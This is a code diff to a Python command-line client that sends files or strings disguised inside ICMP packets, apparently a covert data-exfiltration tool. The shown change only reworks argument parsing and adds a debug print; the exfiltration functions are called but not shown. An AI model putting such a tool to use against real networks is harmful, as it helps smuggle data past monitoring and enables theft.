@@ -68,16 +68,16 @@ def exfiltrateTimeBased(data, ip, src):
 if __name__ == "__main__":
 
     parser = argparse.ArgumentParser(description='Client that sends data disguised in ICMP packets. Keep in mind settings need to be the same for the server')
-    parser.add_argument('-i', '--input', type=str, help='data to be sent')
-    parser.add_argument('-f', '--file', type=str, help='the file where the sum should be written')
-    parser.add_argument('-d', '--dest', type=str, help='the destination of the packets (ex: 127.0.0.1)')
     parser.add_argument('-m', '--mode', type=int, default=1, help='the mode of exfiltration: 1 is lousy (inside packets), 2 time-based')
+
+    dataArgs = parser.add_mutually_exclusive_group(required=True)
+    dataArgs.add_argument('-f', '--file', type=str, help='file to be sent')
+    dataArgs.add_argument('-i', '--input', type=str, help='data to be sent')
+
+    requiredNamed = parser.add_argument_group('required named arguments')
+    requiredNamed.add_argument('-d', '--dest', type=str, help='the destination of the packets (ex: 127.0.0.1)', required=True)
+
     args = parser.parse_args()
-
-
-    # add support for exclusive between input and file
-    # add support for Necessary argument between input or file
-    # add support for necessary ip
 
     data = args.input
 
@@ -85,6 +85,8 @@ if __name__ == "__main__":
         data = dataFile(args.file)
 
     ip = args.dest
+
+    print data, ip, args.file
 
     if args.mode == 1:
         exfiltrateLastBytes(data, ip, args.file)
